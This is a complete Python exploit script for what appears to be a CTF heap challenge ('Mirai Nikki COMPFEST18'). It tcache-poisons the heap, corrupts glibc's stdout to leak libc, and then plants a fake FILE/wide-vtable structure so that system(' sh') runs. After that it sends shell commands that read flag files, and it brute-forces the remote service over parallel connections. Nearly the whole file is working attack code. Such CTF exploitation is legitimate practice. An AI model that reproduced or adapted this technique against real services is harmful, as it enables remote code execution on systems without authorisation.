#!/usr/bin/env python3
import argparse
import fcntl
import os
import random
import re
import select
import socket
import struct
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

BIN = './chall'
LD = './ld-linux-x86-64.so.2'
LIBPATH = '.'

# glibc 2.42 offsets from provided libc.so.6
OFF_STDOUT = 0x2355c0
OFF_SYSTEM = 0x5c4c0
OFF_WFILE_JUMPS = 0x233228

# pointers that usually appear in stdout leak; used for libc base recovery
LIBC_LEAK_OFFS = [0x234b20, 0x2348e0, 0x235644, 0x2355c0, 0x2354e0]
FLAG_RE = re.compile(rb'[A-Za-z0-9_{}-]+\{[^\r\n}]+\}')


def p16(x):
    return struct.pack('<H', x & 0xffff)


def p64(x):
    return struct.pack('<Q', x & 0xffffffffffffffff)


def u64(b):
    return struct.unpack('<Q', b.ljust(8, b'\0')[:8])[0]


class Tube:
    def __init__(self, host=None, port=None, connect_timeout=8.0):
        self.local = host is None
        self.p = None
        self.s = None
        self.buf = bytearray()
        if self.local:
            self.p = subprocess.Popen(
                [LD, '--library-path', LIBPATH, BIN],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0,
            )
            for fd in [self.p.stdout.fileno(), self.p.stderr.fileno()]:
                fcntl.fcntl(
                    fd,
                    fcntl.F_SETFL,
                    fcntl.fcntl(fd, fcntl.F_GETFL) | os.O_NONBLOCK,
                )
        else:
            self.s = socket.create_connection((host, int(port)), timeout=connect_timeout)
            self.s.settimeout(connect_timeout)
            self.s.setblocking(False)

    def close(self):
        try:
            if self.s:
                self.s.close()
        except Exception:
            pass
        try:
            if self.p:
                self.p.kill()
        except Exception:
            pass

    def alive(self):
        if self.local:
            return self.p.poll() is None
        return True

    def _read_once(self, n=4096):
        if self.local:
            try:
                return os.read(self.p.stdout.fileno(), n)
            except BlockingIOError:
                return b''
        try:
            return self.s.recv(n)
        except (BlockingIOError, socket.timeout):
            return b''

    def _wait_readable(self, timeout):
        rfd = self.p.stdout if self.local else self.s
        r, _, _ = select.select([rfd], [], [], timeout)
        return bool(r)

    def recv(self, timeout=0.2):
        out = bytes(self.buf)
        self.buf.clear()
        end = time.time() + timeout
        while time.time() < end:
            if self._wait_readable(0.01):
                c = self._read_once(4096)
                if not c:
                    break
                out += c
                end = time.time() + 0.05
            elif self.local and not self.alive():
                break
        return out

    def recvuntil(self, tok, timeout=2.0):
        tok = bytes(tok)
        data = bytearray()
        if self.buf:
            pos = self.buf.find(tok)
            if pos != -1:
                end = pos + len(tok)
                out = bytes(self.buf[:end])
                del self.buf[:end]
                return out
            data.extend(self.buf)
            self.buf.clear()

        end = time.time() + timeout
        while time.time() < end:
            if self._wait_readable(0.01):
                c = self._read_once(4096)
                if not c:
                    break
                data.extend(c)
                pos = data.find(tok)
                if pos != -1:
                    endpos = pos + len(tok)
                    self.buf.extend(data[endpos:])
                    return bytes(data[:endpos])
            elif self.local and not self.alive():
                break
        raise TimeoutError('recvuntil timeout: ' + repr(tok))

    def send(self, b):
        if isinstance(b, str):
            b = b.encode()
        if self.local:
            self.p.stdin.write(b)
            self.p.stdin.flush()
            return

        view = memoryview(b)
        while view:
            try:
                sent = self.s.send(view)
                if sent == 0:
                    raise EOFError('remote closed connection during send')
                view = view[sent:]
            except BlockingIOError:
                _, w, _ = select.select([], [self.s], [], 0.05)
                if not w:
                    continue
            except (BrokenPipeError, ConnectionResetError, OSError):
                raise EOFError('remote closed connection during send')

    def sl(self, x):
        if isinstance(x, int):
            x = str(x).encode()
        elif isinstance(x, str):
            x = x.encode()
        self.send(x + b'\n')

    def add(self, idx, size):
        self.recvuntil(b'>> ')
        self.sl(1)
        self.recvuntil(b'idx: ')
        self.sl(idx)
        self.recvuntil(b'size: ')
        self.sl(size)

    def delete(self, idx):
        self.recvuntil(b'>> ')
        self.sl(2)
        self.recvuntil(b'idx: ')
        self.sl(idx)

    def edit(self, idx, data):
        self.recvuntil(b'>> ')
        self.sl(3)
        self.recvuntil(b'idx: ')
        self.sl(idx)
        self.recvuntil(b'content: ')
        self.send(data)

    # Use after stdout is corrupted: don't depend on clean prompts.
    def blind_edit(self, idx, data, leak=False):
        self.send(b'3\n')
        self.recv(0.04)
        self.send(str(idx).encode() + b'\n')
        self.recv(0.04)
        self.send(data)
        if leak:
            return self.recv(0.9)
        self.recv(0.08)
        return b''

    def err(self):
        if not self.local:
            return b''
        out = b''
        while True:
            r, _, _ = select.select([self.p.stderr], [], [], 0)
            if not r:
                break
            try:
                out += os.read(self.p.stderr.fileno(), 4096)
            except Exception:
                break
        return out


def maps_info(io):
    maps = open(f'/proc/{io.p.pid}/maps').read().splitlines()
    heap = int([x for x in maps if '[heap]' in x][0].split('-')[0], 16)
    libc = int([x for x in maps if 'libc.so.6' in x and 'r--p' in x and '00000000' in x][0].split('-')[0], 16)
    pie = int([x for x in maps if x.endswith('/chall') and 'r--p' in x and '00000000' in x][0].split('-')[0], 16)
    return heap, libc, pie


def parse_libc(leak):
    for off in range(0, min(len(leak), 0x400) - 7):
        q = u64(leak[off:off + 8])
        for ko in LIBC_LEAK_OFFS:
            base = q - ko
            if (base & 0xfff) == 0 and 0x700000000000 <= base <= 0x7fffffffffff:
                return base
    return None


def predict(io):
    io.recvuntil(b'>> ')
    io.sl(4)
    # Read only the leak line; leave the following menu prompt buffered for the next action.
    out = io.recvuntil(b'\n', timeout=1.0)
    m = re.search(rb'TAKE THIS: ([0-9a-fA-F]+)', out)
    if not m:
        raise RuntimeError('no predict leak')
    return int(m.group(1), 16)


def attempt(host=None, port=None, khi=None, lg=None, local_fast=False, verbose=False, connect_timeout=8.0):
    io = None
    try:
        io = Tube(host, port, connect_timeout=connect_timeout)
        # Important feng shui:
        # 0x460 makes idx0 = heap+0x780 and the real tcache entry for 0x3e0 = heap+0x700.
        # That means only 1 byte of safe-linking key is needed.
        fill = 0x460
        tcache_ptr = 0x700
        unsorted_user = 0x7b0

        io.recvuntil(b'yo', timeout=2.0)
        io.add(6, fill)
        io.add(0, 0x20)
        sec = predict(io)

        if local_fast:
            heap, libc0, _ = maps_info(io)
            key8 = ((heap + 0x780) >> 12) & 0xff
            khi = key8 >> 4
            lg = (libc0 >> 12) & 0xf
        if khi is None or lg is None:
            raise ValueError('need khi/lg guesses')

        key8 = ((khi & 0xf) << 4) | (sec & 0xf)

        io.delete(0)
        io.edit(0, b'\0' * 16)
        io.delete(0)
        io.edit(0, bytes([(tcache_ptr & 0xff) ^ key8]))
        io.add(1, 0x20)
        io.add(2, 0x20)

        io.add(3, 0x410)
        io.add(4, 0x30)
        io.add(0, 0x3e0)
        io.add(1, 0x400)
        io.add(5, 0x400)

        io.delete(1)
        io.delete(5)
        io.edit(2, b'A' * 16 + p16((sec << 12) + tcache_ptr))
        io.delete(0)
        io.delete(3)
        io.edit(2, p16((sec << 12) + unsorted_user))
        io.add(0, 0x3e0)
        io.add(1, 0x400)

        stdout_low = ((lg & 0xf) << 12) + OFF_STDOUT
        io.edit(1, b'B' * 16 + p16(stdout_low))
        io.add(0, 0x400)

        io.edit(0, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
        leak = io.recv(0.9)
        libc = parse_libc(leak)
        if libc is None:
            raise RuntimeError('libc leak failed')

        if verbose:
            print(f'[+] libc={libc:#x} khi={khi:x} lg={lg:x}', flush=True)

        stdout = libc + OFF_STDOUT
        system = libc + OFF_SYSTEM
        wfile_jumps = libc + OFF_WFILE_JUMPS
        fake_wide = stdout + 0x100
        fake_wvt = stdout + 0x300

        payload = bytearray(0x400)
        payload[0:8] = b' sh\0\0\0\0'

        def w(off, val):
            payload[off:off + 8] = p64(val)

        w(0x20, 0)
        w(0x28, 1)
        w(0x30, 0)
        w(0x38, 0)
        w(0x40, 0)
        w(0x88, stdout + 0x500)
        w(0xa0, fake_wide)
        w(0xd8, wfile_jumps)
        w(0x100 + 0x18, 0)
        w(0x100 + 0x30, 0)
        w(0x100 + 0xe0, fake_wvt)
        w(0x300 + 0x68, system)

        io.blind_edit(0, bytes(payload))
        time.sleep(0.15)
        io.send(b'echo PWNED; cat flag.txt 2>/dev/null; cat /srv/app/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; id; exit\n')
        out = io.recv(2.0)
        if b'PWNED' not in out:
            raise RuntimeError('shell failed')
        io.close()
        return out

    except Exception as e:
        if verbose:
            msg = f'[-] attempt failed: {type(e).__name__}: {e}'
            if local_fast and io is not None:
                msg += ' ' + repr(io.err())
            print(msg, flush=True)
        if io is not None:
            io.close()
        return None


def write_bytes(data):
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b'\n'):
        sys.stdout.buffer.write(b'\n')
    sys.stdout.buffer.flush()


def extract_flag(data):
    m = FLAG_RE.search(data)
    return m.group(0) if m else None


def show_result(out):
    with open('flag_raw.bin', 'wb') as f:
        f.write(out)
    write_bytes(out)
    flag = extract_flag(out)
    if flag:
        write_bytes(b'[FLAG] ' + flag)


def run_remote(args):
    host, port = args.host, args.port
    pairs = [(k, l) for k in range(16) for l in range(16)]
    if not args.seq:
        random.shuffle(pairs)

    tries = 0
    lock = threading.Lock()
    stop = threading.Event()
    found = {'try': None, 'out': None}

    def take_job():
        nonlocal tries
        with lock:
            if args.max_tries and tries >= args.max_tries:
                return None
            idx = tries
            tries += 1
            return tries, pairs[idx % len(pairs)]

    def worker():
        while not stop.is_set():
            job = take_job()
            if job is None:
                return
            current_try, (k, l) = job
            if current_try % 16 == 1:
                print(f'[*] try {current_try}...', flush=True)

            try:
                out = attempt(host, port, k, l, verbose=args.verbose, connect_timeout=args.timeout)
            except (TimeoutError, socket.timeout, ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as e:
                if args.verbose:
                    print(f'[-] network error try={current_try} k={k:x} l={l:x}: {type(e).__name__}: {e}', flush=True)
                out = None

            if out:
                with lock:
                    if not stop.is_set():
                        found['try'] = current_try
                        found['out'] = out
                        stop.set()
                return

            if args.sleep > 0 and not stop.is_set():
                time.sleep(args.sleep)

    with ThreadPoolExecutor(max_workers=max(1, args.jobs)) as pool:
        for _ in range(max(1, args.jobs)):
            pool.submit(worker)

    return found['try'] or tries, found['out']


def main():
    ap = argparse.ArgumentParser(description='Mirai Nikki COMPFEST18 exploit - no token version')
    ap.add_argument('host', nargs='?')
    ap.add_argument('port', nargs='?', type=int)
    ap.add_argument('--timeout', type=float, default=8.0, help='socket connect/read timeout seconds')
    ap.add_argument('--sleep', type=float, default=0.02, help='delay between failed remote attempts')
    ap.add_argument('--jobs', type=int, default=8, help='parallel remote attempts')
    ap.add_argument('--max-tries', type=int, default=2048, help='0 = unlimited; default 2048')
    ap.add_argument('--verbose', action='store_true', help='print failure reason for each attempt')
    ap.add_argument('--seq', action='store_true', help='try guesses sequentially instead of shuffled')
    args = ap.parse_args()

    if args.host is None and args.port is None:
        print('[*] local mode')
        out = attempt(local_fast=True, verbose=True, connect_timeout=args.timeout)
        if out:
            show_result(out)
            return

    if args.host is None or args.port is None:
        print(f'Usage: {sys.argv[0]} HOST PORT [--timeout 8] [--sleep 0.02] [--jobs N] [--max-tries N]')
        print(f'Local: {sys.argv[0]}')
        sys.exit(1)

    host, port = args.host, args.port
    print('[*] target: %s:%s' % (host, port))
    print('[*] no token mode: service should show yo / add-delete-edit menu directly')
    print('[*] remote brute: probabilistic; success chance about 1/256 per connection')
    print(f'[*] timeout={args.timeout}s sleep={args.sleep}s jobs={args.jobs} max_tries={args.max_tries or "unlimited"}')

    tries, out = run_remote(args)
    if out:
        show_result(out)
        return

    print(f'[-] no success after {tries} tries')
    print('[-] sanity check: nc HOST PORT must immediately show: yo / [1] add / [2] delete / [3] edit')
    print('[-] try: --verbose --max-tries 32 to see whether it fails at menu, leak, or shell stage')


if __name__ == '__main__':
    main()
